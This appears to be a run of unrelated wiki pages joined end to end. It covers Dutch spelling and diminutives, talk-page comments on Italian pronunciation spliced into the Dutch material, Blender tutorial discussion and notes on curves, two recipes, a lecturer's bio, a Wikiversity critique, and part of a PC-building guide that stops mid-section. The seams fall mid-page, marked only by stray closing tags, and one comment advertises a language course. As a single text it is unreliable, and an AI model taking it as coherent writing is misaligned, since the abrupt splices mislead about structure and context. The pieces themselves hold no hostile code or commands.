Remember that you can do this in English as well: &quot;standard temperature and standard pressure&quot; is often replaced by &quot;standard temperature and pressure&quot;. But note that by omitting the second occurrence of &quot;standard&quot;, the text becomes ambiguous; it can no longer be seen from the text itself whether &quot;standard&quot; applies to just to the temperature, or to the pressure as well. The exact meaning will have to be gathered from the context. 

In Dutch orthography however, by means of the dash, the difference is made clear:

*&quot;Standaardtemperatuur en -druk&quot; means standard temperature and standard pressure
*&quot;Standaardtemperatuur en druk&quot; means standard temperature, and pressure

===Spelling revisions===
{{revise}}
Dutch orthography -in contrast to the English one- used to be changed every half century or so, but recently we have seen revisions every decade. It is fair to say that there is a government (i.e. tax payer) sponsored craze for change and not always for the better. The question whether something is written separately, together, with a diaeresis (''trema'' in Dutch) or with a hyphen seems to be a favorite playground for this kind of activity.

A good example can be found [http://taalunieversum.org/spelling/archief/overzicht_trefwoorden_met_spellingwijziging/ here]. This is a comparison of the changes between 1995 and 2005. Many of these words had already changed in 1995. The result of this kind of changing is that most speakers and writers of the language do not know what to do anymore. The Genootschap Onze Taal (Society 'Our Language') has even published an alternative spelling guide (the little ''white'' book) in opposition to the governmental one (the little ''green'' book). Many publishers and media representatives have joined the revolt.

Obviously, no Dutch speaker will dare to fault a non-native for doing such things wrong.

One aspect of the new spelling is that in compounds a &quot;collision of vowels&quot; in not resolved with a diaeresis anymore but with a dash. There is a verb for &quot;to imitate&quot; that literally means &quot;to ape after&quot; someone. It used to be written as naäpen, now it is na-apen.

==Grammatica 7.2 Diminutives==

Apart from a plural the Dutch noun generally also has a diminutive. It is formed by adding ''-je'' to the noun and is always neuter in gender:

:de vaas - het vaasje

Diminutives have a plural in ''-s'':

:het vaasje - de vaasjes.

===Usage===

''Het vaasje'' literally means ''the little vase'', but the usage in Dutch is quite '''''pervasive'''''. One reason is that turning a word into a diminutive is another way of avoiding the m/f gender problem. Often the diminutive is as frequently or even more frequently used than the noun itself.

A handsize vase will generally be called vaasje. The word 'vaas' is more reserved for something that needs to be carried with both hands.

In some cases the diminutive has acquired a life of its own (become 'lexicalized'). Compare:

:het [[:wikt:nl:ijs|ijs]] - the ice
:het [[:wikt:nl:ijsje|ijsje]] - the ice cream
:de meid - the maid 
:het meisje - the girl
:de kaart - the (geographic, road) map, the postcard
:het kaartje - the ticket, the business card

This implies that a big cone of ice cream becomes: een groot ijsje (''lit.'' a big little ice). In the case of ''meisje'', the original word ''meid'' can be rather derogatory:

:Die meid hoort in het gevang!
::''lit.'' That 'broad' belongs in jail!

It can also be a somewhat colloquial term of endearment:

:Wat 'n leuke meid! -- What a cutie!
:Grote meid! -- Atta-girl!

Lexicalized diminutives are even formed from other parts of speech than nouns.

:tussendoor - in between
:een [[:wikt:nl:tussendoortje|tussendoortje]] - a snack 

Adverbs can be formed from adjective by adding an extra -s:

:zacht - soft
:zachtjes - softly

Even the names of persons are at times turned into the diminutive, usually as a term of endearment:

:Marietje, je bent een schat
::Mary dear, you are a darling

Even cardinal numbers are not safe:

:We gaan met z'n tweetjes
::We'll go the two of us

Some words are better left alone, e.g.:
*de moord - the murder
*de begrafenis - the funeral

Putting these in the diminutive is downright disrespectful and morbid. If would indicate that the speaker is involved with such things for fun on a daily basis. In other words diminutives in Dutch express a whole lot more than just small size. They are a major mechanism of producing derived terms.

===Formation===
The formation of the diminutive sometimes requires the addition of ''-tje'' or ''-pje'', the latter after ''m'':
:het eten - the food
:het etentje - taking someone out for dinner
:de bloem - the flower
:het bloempje - the little flower

In some cases the vowel changes like it does in the plural:

:het pad - the path
:de paden - the paths
:het paadje - the little path, the trail

'''''but''''':

:de schildpad - the turtle
:de schildpadden - the turtles
:het schildpadje - the little turtle

In other cases an extra syllable is inserted:

:de kom - the bowl
:het kommetje

The suffix '''''-je''''' often causes consonants to be more or less pronounced as palatals. (Paadje as IPA /'pacə/ rather than /'patje/). There is considerable variation between the dialects in the formation of the diminutives. Many dialects pronounce -je as -ie /i:/. In others, the suffix tends to be -ke: meiske, blommeke.

The Italian &quot;R&quot; is always rolled, even when the lenght of the sound is short and therefore the rolling hardly noticeable. [[:it:Utente:Paginazero]] not logged --[[User:80.180.184.28|80.180.184.28]] 12:31, 19 Mar 2005 (UTC)

I'm not a native Italian speaker, but when I hear recordings of the simple Italian &quot;r&quot; being pronounced, it usually sounds like a tap rather than a trill. For example: http://www.askoxford.com/languages/it/toi_italian/pronunciation/?view=uk , http://academic.brooklyn.cuny.edu/modlang/carasi/site/pronuncia/pronuncia.html , http://italian.about.com/library/fare/blfareindex02.htm . --[[User:The Lazar|The Lazar]] 06:59, 13 August 2006 (UTC)

== Pronounciation page. ==

I rewrote it in its entirety because the first edition confused me more than anything when I took a look and wasn't very well-formatted(not that this one is). As I am not a native Italian speaker(I am however proficient), please be on the lookout for any errors. Thanks!

--[[User:Kundash|Kundash]] 23:12, 15 December 2005 (UTC)

== A big mistake ==

I corrected all the wrong prononunciations of the vowels: long vowels (like &quot;ei&quot; in &quot;weird&quot; in English) do '''NOT''' exist in italian! Vowels are ALL short, always. Neither are letters like &quot;t&quot; or &quot;r&quot;, however. It's impossible to pronounce [pit:sa], how do you pronounce a long &quot;t&quot;? Letters like &quot;t&quot;, &quot;r&quot;, &quot;f&quot; etc. are simply doubled: ['pittsa] (pizza), ['rosso] (rosso), [ven'totto] (ventotto), etc.

I am a native speaker, and I'm a phonetician, so I know what I'm talking about :)

--[[User:Molo]]

== Q ==

&quot;It is used only, but not always, when followed by approximant u. &quot;

Huh? Only, but not always? How does that work? - Elin

== 't' as in &quot;treasure&quot; ==

Using the 't' in &quot;treasure&quot; as an example seems odd, since I pronounce that word as &quot;chrezhr&quot;, with no 't' sound at all. Unless, of course, you really do mean the 'ch' sound (which from my research appears not to be the case), but either way it's a rather ambiguous example. (I'm refraining from editing because I don't know which sound I should make a better example for)</text>

== Dutch Classes in Amsterdam == 

Hai, if you want to find a really good Dutch course in Amsterdam, then go to http://www.joostweethet.nl

It's a good old fashioned way to learn Dutch (no computers), very communicative and lessons are really funny. I had a great time and learned a lot. 

== Duch pronunciation ==

Er zijn honderden uitspraken te horen van Nederlandstalige woorden te vinden op [http://commons.wikimedia.org/wiki/Category:Dutch_pronunciation Commons] Deze woorden hebben bijna allemaal een woord in de nl:wiktionary .. [[User:GerardM|GerardM]] 14:29, 19 Mar 2005 (UTC)

== Dutch abbreviations ==

One topic for Advanced Students that ought to be covered are Dutch abbreviations whether for Dutch words (like ''a.s.'' for ''aanstaande'', ''E.H.B.O.-post'' for ''Eeerste hulp bij ongelukken-post'' (''First Aid Station'') and ''bijv.'' or ''b.v.'' for ''bijvoorbeeld''), Latin words (like ''c.q.'' for ''casus quo'' (''in that case'') or ''L.S.'' for ''Lectore Salutem'' (''To Whom It May Concern'' on Notices) or for French words (like ''SVP'' for ''S'íl vous plaît'' (''Als 't u blieft'')  . What makes these abbreviations hard for English and Romance-language natives, at least, are:
# There are more of them than in English. (I have an 18 1/2 page list, which does include quite a number of English-language commercial abbreviations like ''CIF'' or ''FOB''.)
# They are more commonly used and reach into critical situations such as ''EHBO''.
# You have to master them if you want to be fully functional in Dutch.
# When the Dutch read out text with abbreviations, they don't say the letters of the abbreviation but the equivalent full text. For example when reading a text with ''c.q.'' in it, they will say ''casus quo'' instead, unlike English where people will say ''i.e.'' as ''I'' then ''E'' or the equivalent in English.[[User:Albertde|Albertde]] 15:31, 10 June 2006 (UTC)

: Now this isn't entirely true. ''c.q.'', for instance, is mostly pronounced as ''C'' followed by ''Q'' in my experience! [[User:Sbashi|Sbashi]] ([[User talk:Sbashi|talk]]) 17:36, 13 August 2009 (UTC)

== Baby steps ==

Baby steps for Dutch learning would be helpful, this wikibook is not very educational. &lt;small&gt;&lt;span class=&quot;autosigned&quot;&gt;—Preceding [[w:Wikipedia:Signatures|unsigned]] comment added by [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|discuss]] • [[Special:Contributions/Ricardoramalho|contribs]]) 0:52, 8 March 2009&lt;/span&gt;&lt;/small&gt;

: Are you suggesting that it would help if the book explained things better? It would similarly help if you were more explicit in your critisisms.
: Also, keep in mind that Wikibooks is a forum for people to collaborate on authoring books, that language textbooks are particularly difficult and that the vast majority of contributors are doing so on a voluntary basis. If you see something that needs fixing, [[Wikibooks:be bold|be bold]]. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 13:40, 8 March 2009 (UTC)

Hello, thanks for the quick reply... We can all be bold, and ''assume good faith''. I think my comment was quite explicit, and useful for editors (as a user feedback). I am a volunteer in other wikiprojects also, so, I am on your side. I understand that this Dutch wikibook is a type of (spartan) grammar book, for consultation, not really designed for a learning process. (although your answer seems a little defensive... or maybe it´s just my imagination) I can help with some (spartan) learning ideas, (any method is better than no method at all), but I don´t speak any Dutch. My suggestion would be to start a &quot;Learn Dutch Book&quot; from scratch.  The Wikilibrary could have many Dutch books! And not just ''the'' book. This one first Dutch book can stay as a second reference book, for the new one. What do you think? I really want to learn Dutch. Sincerely yours, [[User:Ricardoramalho|Ricardoramalho]] ([[User talk:Ricardoramalho|talk]]) 19:08, 8 March 2009 (UTC)

: I'm not sure where you're going with the reference to assuming good faith. I don't think and didn't say or imply that you have any bad intentions for this book. &quot;Baby steps&quot; ''isn't'' very explicit as it doesn't really point out specific weak points or suggest any particular improvements.
: I have no stake in the current state of this book and my comment was not intended for a defense either the contents or the approach, but to solicit a clarification and note that you are free to join in contributing to the book. That you find this book overly grammatical was, for instance, not clear.
: Yes, there is plenty of space for other approaches to learning Dutch. Sorry we don't have a book that caters more to your learning style. Good luck with your studies. --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 03:15, 9 March 2009 (UTC)

==Sound files==
Of course the above criticism is well founded and I have been thinking on how to make the book more accessible to utter beginners. I have added more practice materials with visual information but probably more usefully I am in the process of adding more sound information. Adding loose words as audio is something I do for the Dutch wiktionary anyway, so I have tried to update the vocabulary lists here at least for the first few lessons. I have also started to add sound files for the conversation texts. Unfortunately I do not have a second Dutch speaker at my disposal so I just read the whole text. I have also started to add some longer pronunciation drills. 

It would be nice to have some feedback on this.
[[User:Jcwf|Jcwf]] ([[User talk:Jcwf|talk]]) 19:35, 24 December 2010 (UTC)

==Remarks==
Congratulations with this nice and advanced Wikibook!

However, we Dutch like to quibble:
* ''Inleidingslessen'' is NOT a Dutch word. Poetry? Just try ''Inleiding''? Or ''Inleidende lessen'', that's better. However, lessons in general tend to introduce, so it seems somewhat pleonastic (double).

Kind regards, [[w:User:JMMuller]] Dutch wikipedian (I am going through all the lessons and will report on the Discussion pages ;-))

I think ''Beginnerslessen'' is a better choice. [[Special:Contributions/90.145.160.191|90.145.160.191]] ([[User talk:90.145.160.191|discuss]]) 10:44, 3 January 2013 (UTC)</text>

      <text xml:space="preserve">== Hi Spider! ==

As you probably already saw I added [[Blender Tutorial Links List]] and category [[:Category:Blender|Blender]] where are also collected all [[Blender 3D: Noob to Pro]] book parts, but as you know many of them are not finished yet. Can you please tell me which of them you think are finished? I want to mark finished parts in a proper way.

Thank you! --[[User:Popski|Popski]] 16:00, 19 Mar 2005 (UTC)

: I don't think I would call any of those tutorials &quot;finished&quot; yet.  However, the first 15 are usable at this point.  --[[User:Spiderworm|Spiderworm]] 16:46, 31 Mar 2005 (UTC)

== Moving MemoBook ==

Ok, I did it. Thank you for remark and for chat with my robot ;) --[[User:Popski|Popski]] 16:04, 31 Mar 2005 (UTC)

: Very cool.  Your robot is pretty awesome, btw.  I was very impressed with a number of it's responses.  Keep it up.  --[[User:Spiderworm|Spiderworm]] 16:44, 31 Mar 2005 (UTC)

== Moving Modeling Keyboard Shortcuts? ==

Isn't better '''Keyboard Shortcuts''' or even more precise '''Shortcuts''' ''(MMB, LMB, RMB)'', there is also word '''Hot Keys''' for this? This isn't only about Modeling anyway... --[[User:Popski|Popski]] 13:19, 26 Apr 2005 (UTC)

: Sure!  Go ahead and move it!  --[[User:Spiderworm|Spiderworm]] 15:46, 26 Apr 2005 (UTC)

== Proportional editing ==

I posted this in the discussion for the proportional (O key) editing, but figured I'd let you know directly as well, that I volunteer to do the tutorial for it, and can get started when I'm home in the morning. I plan to have it cover both the sharp and rounded fall off, and the amount of fall off &quot;coverage&quot; with the use of the scroll wheel or zoom amounts. Let me know if there's any other particulars for it that you want me to cover, either here or on the module discussion itself.
Thanks,
--[[User:Camel|camel]] 02:25, May 9, 2005 (UTC)

On this note, I've been unable to get to the tutorial as soon as originally anticipated, but this weekend while I'm off work should be good. I'm going to have to do some playing around though, as it looks like Blender 2.37 will be out soon, and having just downloaded the CVS today it has added a fair amount to proportional editing. In particular I'm going to have to figure out the difference between &quot;on&quot; and &quot;connected&quot;. Thus far I haven't come up with much information so I'm hoping that when it goes B-Con 4 or final release that I'll be able to find at least a little information on it. In the mean time, the added features will definately be nice and make life easy, with a total of 6, up from 2, proportional editing methods. --[[User:Camel|camel]] 13:09, May 12, 2005 (UTC)

: Wow, sounds great.  Everytime they release a new Blender, our work will begin :)  Thanks in advance for your hard work on this.  --[[User:Spiderworm|Spiderworm]] 13:21, 12 May 2005 (UTC)

== Development Stages ==

I see you liked the usage of the development stages. However looking at the link you posted, I see we're doing it with the older version of the system. The latest &quot;correct&quot; method would be to use the stages short|00%|May 11, 2005 rather than the Image: tag. --[[User:Camel|camel]] 23:53, May 11, 2005 (UTC)

: Ooh, let's do it the right way.  Thanx for catching that.  --[[User:Spiderworm|Spiderworm]] 00:25, 12 May 2005 (UTC)


== OpenGL ==

I dont know if this is the right place to put this, but one question I'd think most people would ask (so there is probably and obvious answer) is how do I use Blender models in an OpenGL program?  What formats (and tools) are available for storing the textures, material properties, and vertices/lines/polygons that can be used to build OpenGL display lists?


== Blender Tutorial ==

I've been learning blender using the tutorial you started... It's very helpful!  It does need some work, but it's generally pretty good.  Kudos to you.  I plan to help work on it once I actually understand the program XP. [[User:Oracleoftruth|Oracleoftruth]] 02:02, Jun 9, 2005 (UTC)

: Awesome!  I'm glad it's been helpful.  Stay tuned because there's a lot of big improvements coming, most immediately in the intermediate modeling section.  If you have suggestions fo improvement, please tell us about them, or implement the changes yourself.  Best of luck to you!  --[[User:Spiderworm|Spiderworm]] 02:35, 9 Jun 2005 (UTC)

== Why Use Curves? ==
You’ve learned how versatile mesh objects can be, and how they can easily produce flat surfaces with sharp edges and even give a convincing representation of curved surfaces with rounder edges. So why do we need a separate kind of curve object at all?

There are important reasons.
* The various kinds of curves and surfaces/patches (Bézier, NURBS etc) were used in computer graphics before meshes were developed. In the days when memory was more expensive, they offered a more compact way to represent complex shapes. Even now, they are still common in CAD and other technically-oriented graphics applications, where they make it easy to precisely specify the shape of a curve. Thus, if you are importing data from such applications, you will need the ability to represent such curves—even if you end up converting them to meshes before applying materials and textures for rendering.
* You can use curves as guides for shaping meshes. This makes it easier to construct certain kinds of complicated curved shapes. Particularly since it is simpler to make changes to the curve (with fewer control points), than after it has been converted to a mesh. To this end, Blender defines ''scaling radius'' and ''tilt angle'' settings for curve control points, which make no difference to the appearance of the curve itself, but have an effect when it is used to deform another shape.

== Bézier Versus NURBS ==
In the following pages, you will come across two kinds of curves/patches.

{{B3D:N2P/Note|A '''curve''' is a one-dimensional line through space, while a '''surface''' is two-dimensional. What Blender calls a “surface” is elsewhere in computer graphics commonly referred to as a '''patch'''.}}

''Bézier'' objects only occur in Blender as curves, while ''NURBS'' (“'''N'''on-'''U'''niform '''R'''ational '''B'''-'''S'''pline) objects can be curves or surfaces. If you’ve used 2D drawing programs like Inkscape or Adobe Illustrator, you would have come across Bézier curves before. NURBS curves are a mathematical generalization of these, which are heavily used in CAD applications. Unlike Bézier curves, NURBS curves allow the specification of a variable ''weight'' for each control point, which governs how closely the curve passes to that point.

{{B3D:N2P/Note|That‘s right, “NURBS” is singular, not plural. You will often hear people say “one NURB, many NURBs”, but really it should be “one NURBS, many NURBSes”. Or alternatively, you can finesse the issue by only using “NURBS” as an adjective: “one NURBS curve/surface/object, many NURBS curves/surfaces/objects”.}}

== More Than You Wanted To Know About Curves ==
As usual, Wikipedia has the lowdown on all the interesting trivia about
* [[w:B%C3%A9zier_curve|Bézier curves]]
* [[w:Nurbs|NURBS curves]]

[[Image:Agedashi.jpg|right|frame|Agedashi tofu]]

'''Agedashi tofu''' (or '''''agedashi dofu''''') &amp;#25562;&amp;#12370;&amp;#20986;&amp;#12375;&amp;#35910;&amp;#33104;  is a simple [[Cookbook:Cuisine of Japan|Japanese]] way to serve hot tofu. Silken (''kinugoshi'') firm tofu, cut into cubes, is lightly dusted with potato starch or cornstarch and then [[deep frying|deep fried]] until golden brown. It's then served in a hot tentsuyu broth made of dashi, mirin, and shoyu (Japanese soy sauce), and topped with finely chopped green onions or grated daikon. It is eaten with chopsticks.

==Ingredients==
* 4-6 oz. (~115-170 g) soft [[Cookbook:Tofu|tofu]]
* [[Cookbook:Cornstarch|potato or corn starch]]
* [[Cookbook:Oil|Oil]] for [[Cookbook:Deep frying|deep frying]]

;Sauce:
* ½ cup (120 mL) )[[Cookbook:Dashi|dashi]]
* 2 Tbs (30 mL) [[Cookbook:Soy Sauce|light soy sauce]]
* 1½ Tbs (22.5 mL) [[Cookbook:Mirin|mirin]]

;Condiments:
* [[Cookbook:Green onion|green onion]]s, thinly sliced
* Grated [[Cookbook:Ginger|ginger]]
* Grated [[Cookbook:Daikon|daikon]] (white radish)

==Procedure==


# Cut the soft tofu into rectangular pieces about 1&quot; thick.
# Arrange the layers on rack with paper towels and leave for 10-15 minutes to drain.  Change the paper and turn over the slices.
# In pan, mix sauce ingredients, heat in a pan until boiling. Turn off the heat.
# Sprinkle starch on a plate.   Arrange the tofu slices on it.  Sprinkle more starch over the tofu.   
# Heat the oil to 355°F (180°C) for deep frying.
# Pat any excess starch off the tofu slices and slide them into the hot oil, one by one.  Don't add too many slices at once, because tofu lowers the oil temperature.  Fry until golden, turning once.
# Remove and drain on paper towels.
# Arrange the tofu dish, pour the sauce.  Top with a mound of grated daikon (radish), a bit of grated ginger, and sliced green onions.

At Brookes I encourage the development of off-campus programmes. I was Chair of the Association for Learning Technology (ALT [http://www.alt.ac.uk]) Events Committee. My research explores to what extent ideologies are embedded in artefacts of learning technology. I am an associate lecturer on the Open University MA course, “Language and Literacy in a Changing World” [http://www3.open.ac.uk/courses/bin/p12.dll?C01E844_5_0] and am managing a JISC eLearning Tools project in the field of ePortfolios [http://my-world.typepad.com/my_weblog/].</text>

I wonder if a threaded forum would be helpful.

The overwhelming sense I have of Wikiversity is that of trying to run before walking. This could and should be one of the most exciting developments on the Web and education, however it is paralysed by two fundamental errors:
* the empty replication of a traditional epistemology
* the maintenance of a distinction between teaching and learning

Further to the discussion of governance, are Wikiversitians simply wanting to set up as new gatekeepers of the traditional domains: &quot;meet the new boss...&quot;? Why do &quot;we&quot; need to &quot;keep up with&quot; people who are &quot;on this course&quot;? Just because traditional universities do this doesn't mean Wikiversity needs to or should.

I agree with Andrew, there is an opportunity to do something different but it doesn't have to do with finding out what we can teach; it is about what we want to learn. Learning is far more difficult than teaching. That is why many teachers stop learning as soon as they can and simply replicate aging knowledge. (Of course the good ones don't!)

The long list of faculties and courses that are unpopulated are perhaps testimony to the need to come up with something else. Take it all down! Archive all unpopulated categories.</text>

[[Image:Sv6.png|thumb|Let's make this jeep.]]
The idea of this tutorial is to learn to face a complex project. A vehicle is a nice object to use to test yourself and find new problems.

First, we must understand that a project does not reproduce the real world; a project shows an idea or thought and will result in a final image or video. Whatever does not appear in the final result is unnecessary to include in the model.

What vehicle should we make?  Let's go with the classic jeep.  This will allow for a lot of doodads.

Let's decide what objects of the jeep model will need to be made - body, wheels, seats, and a rocket launcher for good measure.  Objects we can ignore include the engine, which remains hidden under the hood.  There are many additional objects you can make such as a steering wheel to customize your jeep.

'''Portobello mushrooms''' are large mushrooms that can be prepared as a vegetarian entrée.  They can substitute for [[Cookbook:hamburger|hamburger]] patties, or be eaten alone.

==Ingredients==
* One large [[Cookbook:Mushroom|Portobello mushroom]] per person
* [[Cookbook:Olive Oil|Olive oil]]
* [[Cookbook:Salt|Salt]] (as desired)

==Simple Grilling Preparation==
# Remove stems from the mushrooms, wash and dry.
# Brush with olive oil.
# [[Cookbook:Grilling|Grill]] for about 10 minutes, alternating sides, until both sides are grill-marked.

When cooking on a barbecue mixing the oil with a water based liquid (e.g. balsamic vinegar) will cause the fire to flare more and give the food more flavour, baste them as they cook.  Adding other flavours such as garlic and chilli works well. If you are in a hurry, just use vinaigrette dressing.

      <text xml:space="preserve">{{How To Assemble A Desktop PC/Contents}}

The first step to building a computer is acquiring the parts.  This guide will start with a quick explanation of essential parts and elaborate on them further on.

A computer is made up of a '''case''' (or '''chassis''') which houses several important internal components, and provides places to connect the external components, including non-peripherals.

Inside the case go the following internal parts:

*'''Power Supply'''/'''PSU''' – ''power supply unit'', converts outlet power, which is alternating current (AC), to direct current (DC) which is required by internal components, as well as providing appropriate voltages and currents for these internal components. 

*'''Motherboard'''/'''mainboard''' – As the name indicates, this is the electronic centerpiece of the computer: everything else connects to the motherboard.

*'''Processor'''/'''CPU''' –  ''central processing unit'', the &quot;brain&quot; of the computer, most actual computation takes place here.

*'''RAM''' – ''random access memory'', the &quot;short-term memory&quot; of a computer, used by the CPU to store program instructions and data upon which it is currently operating.  Data in RAM is lost when the computer is powered off, thus necessitating a ''hard drive''.

Optional components follow: (Components that depend on the function that will be given to the machine)

*'''Hard Drive'''/'''Hard Disk''' – the &quot;long-term memory&quot; of the computer, used for persistent storage – i.e. the things stored on it remain even when the computer is powered down. The operating system, and all your programs and data are stored here.

*'''Optical Drive''' – device for reading/writing optical disks.  May read CDs, DVDs, or other optical media, depending on the type.  It is essential for installing many operating systems and programs.  It may be able to write some of these discs, as well.  Some people like to have two such drives for copying disks.  

*'''Video Card'''/'''Graphics Card'''/'''GPU''' – does processing relating to video output.  Some motherboards have an &quot;onboard&quot; GPU built in so you don’t need (but may add) a separate video card.  Otherwise, you will need a video card.  These plug into a slot on the motherboard and provide a place to connect a monitor to your computer.

*'''Sound card'''

On top of the internal components listed above, you will also need these external components:

*'''Keyboard''' – for typing on.  Many motherboards won't even boot without a keyboard attached.

*'''Mouse''' – for pointing and clicking.  Unless you chose a text-based operating system, you will likely want one of these.

*'''Monitor''' – This is where the pretty pictures go.  They come in many forms, the most common being [[Wikipedia:Cathode_ray_tube|CRT]] and [[Wikipedia:Lcd|LCD]].

These are the parts that a standard PC will use.  We are not considering such esoterica as headless, touchscreen, or voice-controlled systems.  You might want to make a check list (perhaps using a spreadsheet) of parts to use as you go about your process of research and selection. That way you won’t find yourself sitting down with a pile of brand new hardware only to find that you forgot an essential component.

Before you jump onto the web and start spending lots of money on expensive computer parts, there are three important questions you should answer which will guide your purchases:

# What will be the main function of the computer?
# What useful parts do you have on hand, from an old computer or otherwise?
# How much can you afford to spend on the system?

== What operating system am I going to use? ==
Before you buy components, be sure that they are supported by the operating system you plan to use.  Almost all commonly available PC devices have drivers (small programs that allow the operating system to recognize and work with a hardware device) available for current versions of Windows (generally, XP, Vista, 7, 8 or newer); if you want to run an alternative operating system, you'll have to do some research; many alternatives have extensive 'Hardware Compatibility Lists' (HCLs) as well as software compatibility.

== Main operating systems available ==
* '''Microsoft Windows''' - 2000 (2k), XP (Home/Pro), Vista,  7 (Home/Business/Ultimate), 8 (at revision 8.1) (Normal/Pro)
* '''Popular GNU/Linux Distros''' - [http://www.redhat.com/ Red-Hat], [http://www.ubuntu.com/ Ubuntu], [http://knoppix.net/ Knoppix], [http://www.suse.com/ SuSE], [http://fedoraproject.org/ Fedora], [http://www.debian.org/ Debian], [http://www.parsix.org/ Parsix], and others
* '''Popular BSD Variants''' - [http://www.freebsd.org/ FreeBSD], [http://www.openbsd.org/ OpenBSD], [http://www.netbsd.org/ NetBSD], and others
* '''BeOS''' - No longer supported by the original creators, but was taken over as an open source project
* '''DOS''' - MS-DOS, PC-DOS, DR-DOS, FreeDOS, etc - '''D'''isc '''O'''perating '''S'''ystem

=== Windows information and hardware support lists ===
'''Microsoft Windows''' is a series of operating systems made by the major software corporation Microsoft. Nearly everybody who has worked with computers has used Windows in some way or another. Windows is ideal for most personal computing and fits the needs (or wants) of just about anyone: gamers, video/graphics editors, office workers, or the average guy who wants to surf the web and play a bit of solitaire here and there. Today, Windows XP, Windows Vista, and Windows 7 are the three most common versions of the operating system (Windows 8 being the latest, Windows XP being the most common of the three).

Windows in general supports most processors and motherboards based on the i386 (x86; 32-bit) or x86_64 (AMD64/EM64T; 64-bit) architectures. Put simply, all available consumer processors (especially from AMD or Intel) will work with the Windows XP operating system, as well as most internal and external devices, including Wireless Receivers, Graphics Cards/GPUs, and Storage Devices.

For other hardware, see [http://www.microsoft.com/whdc/hcl/default.mspx/ Microsoft's compatibility list].

=== GNU/Linux information and hardware support lists ===
As one of the most popular open-source (free) operating systems, '''GNU/Linux''' is a very good (and popular) alternative. Linux is a UNIX-like series of operation systems and comes in many different distributions (AKA &quot;distros&quot;), such as [http://www.ubuntu.com/ Ubuntu], [http://www.debian.org/ Debian], [http://www.opensuse.org/ openSuSE], [http://fedoraproject.org/ Fedora], and [http://www.mandriva.com/ Mandriva]. Linux can perform many of the same functions as Windows and features similar programs. Linux is also much more flexible than Windows because it's open-source, making it developer-friendly. Some companies also sell versions of Linux with technical support.

Linux has versions for many different architectures, including i386, x64 and PowerPC. It also support all kinds of processors, enabling it to be used on Palm PCs and even iPods.  There are many different versions of Linux, produced by different companies and organizations. These are called 'distributions' or 'distros' for short. For a desktop PC, you should make sure to pick a desktop distribution, one where the company/organization has desktop users in mind, e.g. [http://www.ubuntu.com/ Ubuntu], [http://fedoraproject.org/ Fedora], or [http://www.mandriva.com/ Mandriva]. It should be noted, however, that many popular programs, especially games, are not available for Linux, and the only way to run them is with special compatibility layers or programs like [http://www.winehq.org/ Wine], which may or may not work with a specific program. Even if you manage to get a certain program running, you may still encounter issues in the program's emulation.

All this is important to bear in mind as different distributions will support different hardware (generally more 'bleeding-edge' distributions will support newer hardware – look at [http://fedoraproject.org/ Fedora], [http://www.suse.com/ SuSE], [http://www.ubuntu.com/ Ubuntu], compared to the latest stable release of [http://www.debian.org/ Debian]). A good rule of thumb to ascertain compatibility, is to buy hardware that is 12 to 18 months old, as it most likely has Linux support with most distributions, but won't be too old. You may also buy newer hardware, and if it follows common standards (eg. x86, ISA, SATA), it should be supported.

=== BSDs information and hardware support lists===
'''BSD''', or the '''Berkeley Software Distribution''', is also a UNIX-Like series of operating systems and could be considered the alternative to Linux (an alternative to an alternative?). Now, BSD is an open-source (free) operating system and has its own descendants, such as [http://www.freebsd.org/ FreeBSD] and [http://www.openbsd.org/ OpenBSD]. BSD Hardware Support is similar to Linux's - it can handle most hardware. Unlike Linux, however, BSD tends not to support &quot;new&quot; hardware (such as Core i7 and Xeon processors) but can handle a lot of both older and modern components. [http://www.freebsd.org/ FreeBSD] is also very compatible with many Linux applications as they are both UNIX-based and can be installed on a variety of platforms (even Xbox consoles!)

== What will be the main function of the computer? ==
If you're going to build a computer from scratch for a specific purpose, you'll want to keep that purpose in mind when choosing your components; don't just go to the store or an online shop and start buying. Consider what you want to use the computer for, you may be able to save money by specifying expensive, premium parts only where needed.

Any reasonably configured computer built from current components will offer adequate Internet browsing and word-processing capabilities. For an office computer, this is often all that is needed. As long as you provide enough RAM for your chosen operating system (256 MB to 1 GB for XP or Linux, 2 GB for Vista) any processor you can buy new will provide acceptable performance.  If the computer is for gaming, a fast processor, the addition of a high-end graphics accelerator card (or two) and extra RAM will provide  a more satisfactory gaming experience. Besides gaming, computers intended for video editing, serious audio work, CAD/CAM, or animation will benefit from beefier components which are specifically designed for that purpose.

Here are some general system categories. Your own needs will probably not fit neatly into one of these, but they are a good way to start thinking about what you are going to use your computer for. With each we’ve indicated the components you should emphasize when building the system.

===Simple web surfer===
To provide basic functionality to a user who just needs web surfing, a little word processing, and the occasional game of solitaire, it’s important not to go overboard. Such a user has no need for a top of the line processor or 3D graphics card. A modestly configured system with an adequate Internet connection will suit this user best and can be assembled quite cheaply.

This usage pattern is not going to stress any particular component, you should be looking at a mid- to low-level processor (historically, and currently, at about the $125 price point or less), enough RAM for the OS and a mother board with built in Ethernet, video and audio. You can use a mid-level case/power supply combo (these components are often sold as a pair). 

If you have a little extra money, spend it on a better monitor, mouse/keyboard, and case/power supply in that order.

===Office computer===
An office computer can be expected to do word processing, spreadsheet and database work, network access, e-mail and a little light development of spreadsheets, databases, and presentations. It might also be called on to do page layout work, some 2D graphic creation, and/or terminal emulation.

None of this stresses any particular component either, but since office workers often run several applications at the same time, and because time is money in this space, a strong mid-level processor is suggested. Typically this would be the processor one or two places from the top of the line. Plenty of RAM will also facilitate multitasking and save time.

You will not need much in the way of 3D graphics power so current generation integrated graphics solutions from both AMD and Intel are perfectly adequate for office tasks.  You should be aware that they will appropriate a portion of the system RAM for video duties thus reducing the total amount of RAM available for the OS and other programs so play accordingly and increase the total system RAM amount to compensate.  Choosing the fastest operating frequency RAM your motherboard and budget can support will positively improve the performance of integrated graphics.  If you decide that you need a dedicated graphics card after all, opt for an inexpensive model.  A sub $75 (for this and other prices in US dollars see [http://www.xe.com/ucc/ www.xe.com/ucc] or other currency converter of your choice for conversion into your local currency) video card with 256 MB or more should be more than sufficient.  However, do your research carefully because many inexpensive graphics cards actually have poorer performance than current generation integrated graphic solutions.

You’ll want a sturdy case (computers kept under desks get kicked by users and poked by cleaning staff) with a reliable power supply but nothing fancy. If you plan on keeping the system running nearly all the time, look for a power supply with a good reliability record. Any extra budget after the above should focus on a better monitor, better/more ergonomic mouse/keyboard and more RAM.

===Server===
A server these days can be anything from a home unit serving MP3's and homework files to the kids, to a machine running a business-critical system for a small business, to a 3u rack mount unit serving up millions of hits a day on the Internet. 

